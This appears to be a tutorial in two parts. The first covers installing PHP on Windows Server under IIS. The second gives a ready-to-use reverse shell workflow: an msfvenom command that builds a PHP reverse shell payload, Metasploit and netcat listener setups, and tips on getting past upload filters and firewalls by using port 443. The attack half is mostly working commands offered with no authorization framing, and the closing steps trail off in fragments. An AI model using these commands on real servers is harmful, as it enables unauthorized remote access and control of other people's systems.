# Setting Up PHP on Windows Server + PHP Reverse Shell (Windows Target)

---

# 🧩 1. Setting Up PHP on Windows Server (IIS)

## Overview

- PHP can be installed on Windows Server and integrated with:
  - IIS (recommended)
  - Apache

---

## Step 1: Download PHP

- Official site:
  https://windows.php.net/download/

- Download:
  - **Non Thread Safe (NTS)** version (for IIS)

Example:
```
https://windows.php.net/downloads/releases/php-8.4.5-nts-Win32-vs17-x64.zip
```

✔ Optimized for:
- IIS
- FastCGI

---

## Step 2: Extract PHP

- Extract ZIP to:

```
C:\PHP
```

✔ This becomes PHP root directory

---

## Step 3: Configure php.ini

- Rename:

```
php.ini-development → php.ini
```

- Common changes:

```
extension_dir = "ext"
cgi.fix_pathinfo = 1
```

- Enable required extensions:

```
extension=mysqli
extension=openssl
```

# 🐚 2. PHP Reverse Shell with msfvenom

---

## Payload Generation

```
msfvenom -p php/reverse_php LHOST=192.168.1.7 LPORT=443 -f raw -o shell.php
```

---

## Parameters Explained

| Option | Description |
|------|------------|
| -p php/reverse_php | PHP reverse shell payload |
| LHOST | Attacker IP |
| LPORT | Listening port |
| -f raw | Raw PHP output |
| -o shell.php | Output file |

---

## 🎧 Listener Setup

### Using Metasploit

```
msfconsole
use exploit/multi/handler
set PAYLOAD php/reverse_php
set LHOST 192.168.1.7
set LPORT 443
run
```

---

### Using Netcat

```
nc -nlvp 443
```

# ⚠️ Common Issues

| Problem | Cause |
|--------|------|
| No reverse connection | Wrong LHOST / network issue |
| Payload not executed | PHP disabled/misconfigured |
| Upload blocked | File restrictions |
| Connection dropped | Firewall / IDS/IPS |

4. Upload shell

- Prefer **443 port (egress allowed)**

  - File upload filters
